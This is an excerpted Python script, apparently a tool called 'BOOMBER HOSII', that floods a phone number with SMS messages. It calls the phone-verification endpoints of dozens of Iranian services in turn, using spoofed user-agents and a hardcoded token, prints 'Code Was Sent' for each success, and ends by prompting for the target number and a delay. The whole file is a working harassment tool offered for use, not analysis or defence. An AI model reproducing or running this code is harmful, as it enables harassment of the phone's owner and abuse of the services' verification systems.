...
os.system('pip install stdout')
os.system('clear')
letters =  pyfiglet.figlet_format('BOOMBER     HOSII')
for char in letters:
        stdout.write(char)
        stdout.flush()
        sleep(0.0001/0.01)	
...
def snap(phone):
    ...
    try:
        ...
        if "OK" in snapR:
            print(f'{g}(Snap) {r}Code Was Sent')
            return True
    except:
        pass
def gap(phone):
...
def tap30(phone):
    ...
    try:
        ...
        if tap30R['result'] == "OK":
            print(f'{g}(Tap30) {r}Code Was Sent')
            return True
    except:
        pass
...
'x-standard-divar-error': 'true'}
    ...
    try:
        ...
        if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
            print(f'{g}(Divar) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if torobR["message"] == "pin code sent":
            print(f'{g}(Torob) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    ...
    try:
        ...
        if sfoodR['status'] == True:
            print(f'{g}(SnapFood) {r}Code Was Sent')
            return True
    except:
        pass
...
def sheypoor(phone):
    ...
    try:
        ...
        if sheyporR['success'] == True:
            print(f'{g}(Sheypoor) {r}Code Was Sent')
            return True
    except:
        pass
...
'x-xsrf-token': ''}
    try:
        ...
        if 'success' in okR:
            print(f'{g}(OfoghKourosh) {r}Code Was Sent')
            return True
    except:
        pass
...
def alibaba(phone):
    ...
    try:
        ...
        if alibabaR["result"]["success"] == True:
            print(f'{g}(AliBaba) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket) {r}Code Was Sent')
            return True
    except:
        pass
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if gaR['Code'] == 1:
            print(f'{g}(GapFilm) {r}Code Was Sent')
            return True
    except:
        pass
def sTrip(phone):
    ...
    try:
        ...
        if sTripR['status_code'] == 200:
            print(f'{g}(Strip) {r}Code Was Sent')
            return True
    except:
        pass
...
def filmnet(phone):
    ...
    try:
        ...
        if Filmnet['meta']['operation_result'] == 'success':
            print(f'{g}(Filmnet) {r}Code Was Sent')
            return True
    except:
        pass
...
def drdr(phone):
    ...
    try:
        ...
        if drdr['status'] == 'success':
            print(f'{g}(DrDr) {r}Code Was Sent')
            return True
    except:
        pass
...
def itool(phone):
    ...
    try:
        ...
        if ok['success'] == True:
            print(f'{g}(Itool) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok['status'] == True:
            print(f'{g}(AnarGift) {r}Code Was Sent')
            return True
    except :
        pass
...
'username': 'BimitoClient'
    ...
    try:
        ...
        if ok["messageCode"] == 201:
            print(f'{g}(Azki) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'ok':
            print(f'{g}(Chamedoon) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'success':
            print(f'{g}(BaniMode) {r}Code Was Sent')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if 'تایید شماره تلفن همراه' in lendoR:
            print(f'{g}(Lendo) {r}Code Was Sent')
            return True
    except:
        pass
def olgoo(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
            print(f'{g}(NashrOlgoo) {r}Code Was Sent')
            return True
    except:
        pass
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        if ok['code'] == '1':
            print(f'{g}(PakhshShop) {r}Code Was Sent')
            return True
    except:
        pass
def didnegar(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{g}(DideNegar) {r}Code Was Sent')
            return True
    except:
        pass
def baskol(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        if ok['status'] == True:
            print(f'{g}(Baskol) {r}Code Was Sent')
            return True
    except:
        pass
def kilid(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['status'] == 'SUCCESS':
            print(f'{g}(Kilid) {r}Code Was Sent')
            return True
    except:
        pass
def basalam(phone):
...
'x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
    try:
        ...
        if ok.status_code == 200:
            print(f'{g}(BaSalam) {r}Code Was Sent')
            return True
    except:
        pass
def see5(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    ...
    try:
        if ok == 'send_sms':
            print(f'{g}(See5) {r}Code Was Sent')
            return True
    except:
        pass
def ghabzino(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok["Parameters"] != None:
            print(f'{g}(Ghabzino) {r}Code Was Sent')
            return True
    except:
        pass
def simkhanF(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
            print(f'{g}(SimKhan) {r}Code Was Sent')
            return True
    except:
        pass
def simkhanT(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
            print(f'{g}(DrSaina) {r}Code Was Sent')
            return True
    except:
        pass
def binjo(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['status'] == 'ok':
            print(f'{g}(BinJo) {r}Code Was Sent')
            return True
    except:
        pass
def limome(phone):
...
'X-Requested-With': 'XMLHttpRequest'}
    try:
        ...
        if liR['status'] == 'success':
            print(f'{g}(Limome) {r}Code Was Sent')
            return True
    except:
        pass
def bimito(phone):
...
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        ...
        if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
            print(f'{g}(BimitoVip) {r}Code Was Sent')
            return True
    except:
        pass
def bimitoVip(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        print(f'{g}(SeebIrani) {r}Code Was Sent')
        return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        print(f'{g}(MihanPezeshk) {r}Code Was Sent')
        return True
    except:
        pass
def mek(phone):
...
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
    ...
    try:
        ...
        if meR['isSuccess']:
            print(f'{g}(HamrahMechanic) {r}کد ارسال شد')
            return True
    except: pass
# ================================[SEND SMS FUNC]================================
...
while True:
    phone = is_phone(input(f'{g}[?] {g}number (whitout 0){g} {r}>>>> {g}'))
    if phone:
        break
try:
    Time = float(input(f'{g}[?] {g}sleep time  {g}[normal=0.1] {r}>>>> {g}'))
except ValueError:
    Time = 0.1
